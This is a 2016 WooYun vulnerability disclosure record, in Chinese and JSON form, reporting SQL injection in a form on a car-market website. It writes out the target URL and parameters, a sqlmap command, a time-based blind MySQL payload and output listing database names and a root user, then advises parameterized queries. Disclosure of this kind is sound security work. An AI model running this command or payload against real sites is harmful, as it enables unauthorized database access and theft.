{"id": 74523, "wybug_id": "wooyun-2016-0177010", "wybug_title": "某站SQL注入", "wybug_corp": "网上车市", "wybug_author": "路人甲", "wybug_date": "2016-02-19 15:04", "wybug_open_date": "2016-02-24 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 当用户可控的数据未经过恰当的处理就进入了数据库执行的SQL语句中时，就可能存在SQL注入漏洞。攻击者可以定制特定的字符来改变SQL语句的语义。通过SQL注入漏洞可以造成多种危害，包括读取或者修改应用的数据，改变程序逻辑，提升权限和执行操作系统命令等。 详细说明：  上一个重复了。不好意思~~~~~~ \npost  http://app.cheshi.com/topic/1027jeep/insert.phpinfo1=11.1&info2=dd&info3=%E5%85%88%E7%94%9F&info4=15333333333&info5=ddd%40qq.com&province=3&city=112&info8=%E7%89%A7%E9%A9%AC%E4%BA%BA%E4%BA%8C%E9%97%A8%E6%AC%BE&info9=%E6%B2%A1%E6%9C%89%E5%85%B4%E8%B6%A3&info10=%E5%8D%8A%E5%B9%B4%E5%86%85&info11=20%E4%B8%87%E5%85%83%EF%BD%9E35%E4%B8%87%E5%85%83&info12=1%E5%B9%B4&info13=%E6%8A%A5%E7%BA%B8\n参数存在sql注入。poc：root 权限\nsqlmap git:(master) ✗ python sqlmap.py -u http://app.cheshi.com/topic/1027jeep/insert.php --data=\"info1=11.1&info2=dd&info3=%E5%85%88%E7%94%9F&info4=15333333333&info5=ddd%40qq.com&province=3&city=112&info8=%E7%89%A7%E9%A9%AC%E4%BA%BA%E4%BA%8C%E9%97%A8%E6%AC%BE&info9=%E6%B2%A1%E6%9C%89%E5%85%B4%E8%B6%A3&info10=%E5%8D%8A%E5%B9%B4%E5%86%85&info11=20%E4%B8%87%E5%85%83%EF%BD%9E35%E4%B8%87%E5%85%83&info12=1%E5%B9%B4&info13=%E6%8A%A5%E7%BA%B8\"         _ ___ ___| |_____ ___ ___  {1.0-dev-f54b25c}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:53:22[13:53:22] [INFO] resuming back-end DBMS 'mysql'[13:53:22] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: info1 (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: info1=11.1' AND (SELECT * FROM (SELECT(SLEEP(5)))nmwD) AND 'bswH'='bswH&info2=dd&info3=%E5%85%88%E7%94%9F&info4=15333333333&info5=ddd@qq.com&province=3&city=112&info8=%E7%89%A7%E9%A9%AC%E4%BA%BA%E4%BA%8C%E9%97%A8%E6%AC%BE&info9=%E6%B2%A1%E6%9C%89%E5%85%B4%E8%B6%A3&info10=%E5%8D%8A%E5%B9%B4%E5%86%85&info11=20%E4%B8%87%E5%85%83%EF%BD%9E35%E4%B8%87%E5%85%83&info12=1%E5%B9%B4&info13=%E6%8A%A5%E7%BA%B8---[13:53:23] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.14back-end DBMS: MySQL 5.0.12\n   漏洞证明：  数据库相关信息证明\normation_schema[13:58:28] [INFO] retrieved: api[13:59:11] [INFO] retrieved: api_queue[14:01:13] [ERROR] invalid character detected. retrying..[14:01:13] [WARNING] increasing time delay to 4 seconds[14:01:14] [INFO] retrieved: appstore[14:03:47] [INFO] retrieved: bbsold[14:05:33] [INFO] retrieved: commondata[14:08:26] [INFO] retrieved: mobile_app[14:11:30] [INFO] retrieved: mysql[14:12:58] [INFO] retrieved: performance_schema[14:18:02] [INFO] retrieved: play[14:19:17] [INFO] retrieved: register[14:21:33] [INFO] retrieved: research[14:23:41] [INFO] retrieved: seller_hd[14:26:27] [INFO] retrieved: seller_hd_tmp[14:30:41] [INFO] retrieved:[14:31:06] [ERROR] invalid character de\n\n14:45:59] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.14back-end DBMS: MySQL 5.0.12[14:45:59] [INFO] fetching database users[14:45:59] [INFO] fetching number of database users[14:45:59] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)[14:46:05] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptionsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y1[14:46:22] [INFO] adjusting time delay to 2 seconds due to good response times2[14:46:23] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)'root'@'localhost'\n   修复方案：  最有效的防御SQL注入的方式是在所有的数据库操作上使用参数化查询（也被称为预编译)。预编译通过两步把可能存在危害的数据整合到SQL查询中。第一步，应用定义查询语句的结构，在语句中预留位置给用户输入。第二部，应用把每个位置需要的用户输入传递给数据库。因为第一步中，应用已经定义了语句的结构，数据库已经对语法进行了编译，第二部中及时传入恶意的用户输入也无法影响SQL语句的语意，从而避免了SQL注入攻击。对于不同的数据库和编程语言需要查询文档，寻找合适的api。强烈建议使用参数化处理SQL语句中的每一个变量。需要注意的是以下一些防御SQL注入的方式并不总是有效的，所以不建议大家使用以下的方式防御SQL注入：一种常见的方式是在用户数据拼接到SQL语句之前转义其中的单引号。这是为了避免用户插入单引号，改变了SQL的语法。但是如果变量类型是数字型，这种防御就可能失败。因为SQL语句结构中并没有单引号包裹变量的话，仅仅使用空格就可以改变语法结构。另一种常见的防御方案是使用存储过程。尽管存储过程提供了很多安全特性，但是并不能保证防御SQL注入。当存储过程中可以动态创建SQL结构的时候就可能会发生SQL注入。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-24 15:10 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}